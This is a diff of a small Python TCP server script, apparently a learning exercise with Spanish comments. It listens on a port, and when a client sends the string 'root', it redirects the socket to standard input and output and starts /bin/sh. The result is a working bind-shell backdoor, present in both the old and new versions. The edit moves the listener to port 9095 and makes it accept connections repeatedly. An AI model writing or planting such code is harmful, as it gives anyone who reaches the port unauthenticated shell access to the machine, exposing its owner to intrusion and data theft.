@@ -9,90 +9,53 @@ import datetime
 
 
 def main():
-	# IP address of the server
-	host = ''
+    # IP address of the server
+    host = socket.gethostbyname(socket.gethostname())
 
-	# Port number of the server
-	port = 1338
+    # Port number of the server
+    port = 9095
 
-	# Create a TCP server socket
-	tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print("Connecting to {}:{} ...".format(host, port))
 
-	try:
-		tcp_socket.settimeout(20)
-		tcp_socket.bind((host, port))
-		tcp_socket.listen(1)
+    # Create a TCP server socket
+    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-		(client, address) = tcp_socket.accept()
+    # try:
+    #tcp_socket.settimeout(50)
+    tcp_socket.bind((host, port))
+    tcp_socket.listen(1)
 
-		print(f"Address: {address}, client: {client.getpeername()}")
+    while True:
+        (client, address) = tcp_socket.accept()
 
-		client.send("Hola Mundo")
+        print(f"Address: {address}, client: {client.getpeername()}")
 
-		response = client.recv(1024)
-		print(f"Response: {response}")
+        client.send("Hola Mundo\n".encode())
 
-		while True:
-			if response == "root\n":
-				print("We are in root")
-				for f in range(3):
-					os.dup2(client.fileno(), f)
-				os.execl("/bin/sh", "/bin/sh")
-				code.interact()
-				sys.exit()
-			else:
-				print("exit")
-				break
+        response = client.recv(1024).decode()
+        print("Response: {}".format(response))
 
-		client.close()
-		tcp_socket.close()
-	except Exception as Ex:
-		print("Exception Occurred: %s" % Ex)
+        if response == "root\n":
+            print("We are in root")
+            for f in range(3):
+                os.dup2(client.fileno(), f)
+            os.execl("/bin/sh", "/bin/sh")
+            code.interact()
+            sys.exit()
+        else:
+            print("exit")
+            break
 
-		# Close the socket upon an exception
-		tcp_socket.close()
+    client.close()
+    tcp_socket.close()
 
 
-# # Bind the tcp socket to an IP and port
-# s.bind((host, port))
-#
-# # Keep listening
-# s.listen()
-#
-# while True:
-# 	# Keep accepting connections from clients
-# 	(client, direction) = s.accept()
-#
-# 	print(direction)
-# 	print(client.getpeername())
-#
-# 	# Send current server time to the client
-# 	server_time_now = "%s" % datetime.datetime.now()
-# 	client.send(server_time_now.encode())
-# 	print("Sent %s to %s" % (server_time_now, direction))
-#
-# 	# Close the connection to the client
-# 	client.close()
+# except Exception as E:
+#   print("Exception: {} ".format(E))
 
-
-# client.send("Hola eni\n")
-# palabra = client.recv(1024)
-#
-# print(palabra)
-#
-# if palabra == "root\n":
-# 	print("Estamos en root")
-# 	for f in range(3):
-# 		os.dup2(client.fileno(), f)
-# 	os.exec1("/bin/sh", "/bin/sh")
-# 	code.interact()
-# 	sys.exyt()
-# else:
-# 	print("Salimos")
-#
-# client.close()
-# s.close()
+# Close the socket upon an exception
+#  tcp_socket.close()
 
 
 if __name__ == '__main__':
-	main()
+    main()
